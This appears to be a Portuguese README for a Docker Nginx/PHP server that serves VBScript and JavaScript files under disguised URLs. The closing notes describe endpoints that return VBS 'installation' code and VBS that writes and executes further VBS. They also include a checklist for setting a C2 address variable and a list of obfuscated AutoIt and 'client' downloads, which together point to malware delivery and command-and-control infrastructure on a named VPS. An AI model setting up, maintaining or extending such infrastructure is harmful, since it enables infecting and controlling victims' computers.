# SERVER_WEB_CLIENT_DOWN

Stack Docker com **Nginx** e **PHP-FPM** (PHP 8.3), rede interna `skynet-network`, documento raiz HTTP em `public/`.

## Requisitos

- Docker e Docker Compose (plugin `docker compose` ou binário `docker-compose`)

## Arranque (desenvolvimento local)

Apenas HTTP na porta 80 (sem certificados no host):

```bash
docker compose up -d --build
```

- **HTTP:** porta `80` → Nginx  
- **HTTPS:** porta `443` mapeada; em dev o contentor não tem TLS configurado no `default.conf` local.

Contentores:

| Serviço | Contentor      | Função        |
|---------|----------------|---------------|
| `nginx` | `skynet-nginx` | Servidor web  |
| `php`   | `skynet-php`   | PHP-FPM :9000 |

Ambos usam `restart: unless-stopped` e montam o projeto em `/var/www`.

## Produção com HTTPS (Let’s Encrypt no VPS Linux)

No servidor (após parar o Apache ou qualquer serviço que use 80/443), com certificados já existentes em:

`/etc/letsencrypt/live/80.32.109.208.host.secureserver.net/`

(use o ficheiro dedicado que monta esses caminhos e a config SSL):

```bash
docker compose -f docker-compose.ssl.yml up -d --build
```

Este ficheiro:

- monta `/etc/letsencrypt` em **read-only** no Nginx;
- usa [docker/nginx/ssl/production.conf](docker/nginx/ssl/production.conf) (HTTP: `/.well-known/acme-challenge/` + redirecionamento para HTTPS; HTTPS: mesma app que em dev).

Se o **FQDN** ou os caminhos dos `.pem` mudarem, edita `docker/nginx/ssl/production.conf` e volta a subir o Nginx.

### Renovação Certbot no host

Após `sudo certbot renew` (ou renovação automática), recarrega o Nginx para reler os certificados:

```bash
docker exec skynet-nginx nginx -s reload
```

Opcional: hook em `/etc/letsencrypt/renewal-hooks/deploy/` com o comando acima.

### Desafio ACME (webroot)

O Nginx serve `/.well-known/acme-challenge/` a partir de `root /var/www/public`; existe [public/.well-known/acme-challenge/](public/.well-known/acme-challenge/) para o Certbot gravar ficheiros quando usares `-w /caminho/para/public` no host (ajusta ao caminho real do projeto no VPS).

## Estrutura relevante

| Caminho (host) | No contentor (Nginx `root`) | Notas |
|----------------|-----------------------------|--------|
| `public/`      | `/var/www/public`           | Raiz HTTP |
| `public/uploads/` | `/var/www/public/uploads` | Ficheiros estáticos em `/uploads/` |
| `docker/nginx/conf.d/default.conf` | `/etc/nginx/conf.d/default.conf` | Config **dev** (só HTTP) |
| `docker/nginx/snippets/` | `/etc/nginx/snippets/` | Partilhado dev/prod (`app-common.conf`, `ssl-params.conf`) |
| `docker/nginx/ssl/production.conf` | (só com `docker-compose.ssl.yml`) | Config **produção** TLS |
| `docker/php/`  | —                           | Imagem PHP-FPM |

## Redirecionamentos (equivalente a `.htaccess`)

A lógica comum está em [docker/nginx/snippets/app-common.conf](docker/nginx/snippets/app-common.conf), incluída pelo `server` em dev e pelo `server` HTTPS em produção.

| Padrão da URL (termina em) | Destino interno |
|----------------------------|-----------------|
| `…1.vbs`, `…2.vbs`, `…3.vbs` | `/g1/v1/index.php`, `/g2/v1/index.php`, `/g3/v1/index.php` |
| `…1.js`, `…2.js`, `…3.js`   | `/g1/j1/index.php`, `/g2/j1/index.php`, `/g3/j1/index.php` |

## Alterar configuração

Depois de editar ficheiros em `docker/nginx/`:

```bash
docker exec skynet-nginx nginx -t && docker exec skynet-nginx nginx -s reload
```

Ou recria o serviço:

```bash
docker compose up -d nginx
```


pastas
vb - retorna o codigo do vbs para instalaçao
vbc - retorna o codigo para vbs que cria e exeuca vbs no publico


CHECKLIST DE PRODUÇAO 
Colocar o s em %varC2% ^& "s://" no arquivo vbc/consts.txt, dr quiser seguir como as pastas adicione /g%icontador%^


downloads
1- fg4gasgam1.fdgr3 autoit fg4gasgam3.fdgr3
2- v/fg4gasg472.fdgr3 client  fg4gasg472.fdgr3
3- fg4gasgam3.fdgr3 script fg4gasgam1.fdgr3

 
